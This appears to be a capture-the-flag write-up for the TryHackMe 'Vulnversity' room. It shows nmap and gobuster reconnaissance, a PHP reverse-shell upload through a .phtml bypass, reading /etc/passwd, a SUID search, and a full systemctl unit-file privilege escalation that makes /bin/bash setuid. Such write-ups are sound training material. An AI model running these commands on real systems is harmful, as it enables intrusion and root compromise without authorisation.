---
layout: post
permalink: /posts/thm/vulnversity
title: "Vulnversity"
---

Here is another enjoyable room. As always let's scan the target machine with nmap.

```
nmap -sC -sV <machine-ip>
```

![nmap-scan](/assets/images/thm/vulnversity/nmap-scan.png)

From the nmap result we can see there are open ports 21, 22, 139, 445, 3128 and 3333. Go and visit the website on port 3333

![website](/assets/images/thm/vulnversity/website.png)

Now scan the website with gobuster

```
gobuster dir -u http://<machine-ip> -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
```

We have found a directory /internal

![internal](/assets/images/thm/vulnversity/internal.png)

After some tries we found out we can uploat files with .phtml extension. Upload php reverse shell code, set listener and go to http://10.10.176.156:3333/internal/uploads and open your script. Now we have shell access.

```
cat /etc/passwd
```

![passwd](/assets/images/thm/vulnversity/passwd.png)

Search for files with SUID permisson

```
find / -user root -perm -4000
```

![suid](/assets/images/thm/vulnversity/suid.png)

<https://gtfobins.github.io/gtfobins/systemctl/> <br />
Keep in mind that you might need to press Enter additionally after you’ve pasted and ran the commands.

```
-----------------------
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
-----------------------
to get root access

-----------------------------------------------------------
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
-----------------------------------------------------
press Enter and type bash -p
```
